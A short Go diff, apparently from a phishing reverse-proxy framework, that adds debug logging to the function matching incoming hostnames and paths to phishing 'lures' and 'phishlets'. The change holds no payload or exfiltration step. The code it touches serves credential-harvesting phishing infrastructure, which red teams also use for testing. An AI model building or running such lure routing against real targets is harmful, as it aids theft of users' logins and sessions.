@@ -1067,6 +1067,7 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 		if l.Phishlet == site && l.Path == path {
 			// Check custom lure hostname
 			if host == l.Hostname {
+				log.Debug("[lure] matched by hostname: %s", host)
 				return l, nil
 			}
 			// Check against ALL proxy hosts of the phishlet (not just the first landing host)
@@ -1078,7 +1079,9 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 				phishDomain, ok := c.GetSiteDomain(pl.Name)
 				if ok {
 					for _, ph := range pl.proxyHosts {
-						if host == combineHost(ph.phish_subdomain, phishDomain) {
+						phishHost := combineHost(ph.phish_subdomain, phishDomain)
+						if host == phishHost {
+							log.Debug("[lure] matched by proxy host: %s", phishHost)
 							return l, nil
 						}
 					}
@@ -1086,6 +1089,7 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 			}
 		}
 	}
+	log.Debug("[lure] not found: site=%s host=%s path=%s", site, host, path)
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
